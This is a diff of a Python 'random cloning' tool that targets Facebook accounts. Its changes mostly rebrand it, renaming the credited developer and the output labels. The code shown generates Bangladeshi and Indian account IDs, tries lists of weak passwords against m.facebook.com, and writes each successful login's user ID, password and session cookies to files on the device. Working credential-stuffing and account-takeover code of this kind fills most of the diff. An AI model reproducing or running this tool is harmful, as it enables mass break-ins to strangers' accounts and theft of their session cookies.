@@ -31,27 +31,22 @@ def clear():os.system('clear');print(logo)
 def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 #________________ LOGOX ______________#
 logo=(f'''
-        {A} _   _  ____   _   _ 
-     {A}) \_/ (/  _ \ ) \_/ (
-     {A}|  _  |)  ' / |  _  |
-     {A})_( )_(|_()_\ )_( )_(''')
+              {A}┏┓┓ ┏┏┓┏┓
+              {A}┗┓┃┃┃┣┫┃┓
+              {A}┗┛┗┻┛┛┗┗┛ V/0.0
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{A}[=] DEVELOPER : MRIDUl ISLAM
+{A}[√] DEVELOPER : HABIB HOSSAIN
 {A}[=] TOOL      : RANDOM CLONING {A}[{G}BD{A}|{G}IND{A}]
-{A}[=] Github    : github.com/MRM-404
-{A}[=] Status    :Free
-{A}[=] Version   :0.1
-{A}[=] Tools     :MRM-404
-{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
- #________________ MENU _____________#
+{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''') 
+#________________ MENU _____________#
 def menu():
     clear()
-    print(f'{A}[1] RANDOM {G}BD-MIX {A}CLONE ');print(f'{A}[2] RANDOM {G}BD-NEW {A}CLONE');print(f'{A}[3] RANDOM {G}IND {A}CLONE');print(f'{A}[0] EXIT MRM');linex()
-    MRM=input(f'{A}[?] CHOICE : ')
-    if MRM in '1':randm_bd_mix()
-    if MRM in '2':randm_bd_new()
-    if MRM in '3':randm_ind()
-    if MRM in '0':sys.exit(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print(f'{A}[1] RANDOM {G}BD-MIX {A}CLONE ');print(f'{A}[2] RANDOM {G}BD-NEW {A}CLONE');print(f'{A}[3] RANDOM {G}IND {A}CLONE');print(f'{A}[0] EXIT SWAG');linex()
+    swag=input(f'{A}[?] CHOICE : ')
+    if swag in '1':randm_bd_mix()
+    if swag in '2':randm_bd_new()
+    if swag in '3':randm_ind()
+    if swag in '0':sys.exit(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 #________________ RANDOM-BD-MIX _____________# 
 def randm_bd_mix():
      clear()
@@ -145,8 +140,8 @@ def randm_ind():
         for love in user:
             uid = code+love
             pss = ['57575752','india123','57575751','57273200','59039200',uid,love,uid[3:]]
-            if mthd in ['1','01']:mridulx.submit(habibxx1,uid,pss)
-            if mthd in ['2','02']:mridulx.submit(habibxx2,uid,pss)
+            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
+            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
      print(f' ')
      print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      print(f"{A}[=] CLONE COMPLETE BROTHER ")
@@ -159,7 +154,7 @@ def habibxx1(uid,pss):
     try:
         for ps in pss:
             session=requests.Session()
-            sys.stdout.write(f'\r\r{A}[MRM-M1] {loop} {len(oks)}|{len(cps)} ')
+            sys.stdout.write(f'\r\r{A}[SWAG-M1] {loop} {len(oks)}|{len(cps)} ')
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
@@ -201,9 +196,9 @@ def habibxx1(uid,pss):
                 uid = re.findall('c_user=(.*);xs', coki)[0]
                 balxd1 = requests.get(f"https://graph.facebook.com/"+uid+"/picture?type=normal").text
                 if 'Photoshop' in balxd1:
-                    print(f'\r\r{G}[MRM-OK] {uid} | {ps} | {coki}')
+                    print(f'\r\r{G}[SWAG-OK] {uid} | {ps} | {coki}')
                     linex()
-                    open('/sdcard/MRM-RANDM-OK-M1.txt', 'a').write(uid+' | '+ps+' |-> '+coki+"\n")
+                    open('/sdcard/SWAG-RANDM-OK-M1.txt', 'a').write(uid+' | '+ps+' |-> '+coki+"\n")
                     oks.append(uid)
                     break
                 else:pass
@@ -211,8 +206,8 @@ def habibxx1(uid,pss):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #print(f'\r\r{Y}[MRM-CP] {uid} | {ps}')
-                open('/sdcard/MRM-RANDM-CP','a').write(uid+'>'+ps+'\n')
+                #print(f'\r\r{Y}[SWAG-CP] {uid} | {ps}')
+                open('/sdcard/SWAG-RANDM-CP','a').write(uid+'>'+ps+'\n')
                 cps.append(uid)
                 break
             else:
@@ -226,7 +221,7 @@ def habibxx2(uid,pss):
     try:
         for ps in pss:
             session=requests.Session()
-            sys.stdout.write(f'\r\r{A}[MRM-M2] {loop} {len(oks)}|{len(cps)} ')
+            sys.stdout.write(f'\r\r{A}[SWAG-M2] {loop} {len(oks)}|{len(cps)} ')
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
@@ -269,9 +264,9 @@ def habibxx2(uid,pss):
                 balxd2 = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 uff = requests.get(balxd2).text
                 if 'Photoshop' in uff:
-                    print(f'\r\r{G}[MRM-OK] {uid} | {ps} | {coki}')
+                    print(f'\r\r{G}[SWAG-OK] {uid} | {ps} | {coki}')
                     linex()
-                    open('/sdcard/MRM-RANDM-OK-M2.txt', 'a').write(uid+' | '+ps+' |-> '+coki+"\n")
+                    open('/sdcard/SWAG-RANDM-OK-M2.txt', 'a').write(uid+' | '+ps+' |-> '+coki+"\n")
                     oks.append(uid)
                     break
                 else:pass
@@ -279,14 +274,14 @@ def habibxx2(uid,pss):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #print(f'\r\r{Y}[MRM-CP] {uid} | {ps}')
-                open('/sdcard/MRM-RANDM-CP','a').write(uid+'>'+ps+'\n')
+                #print(f'\r\r{Y}[SWAG-CP] {uid} | {ps}')
+                open('/sdcard/SWAG-RANDM-CP','a').write(uid+'>'+ps+'\n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-    except: 
+    except:
         pass
 
 menu()
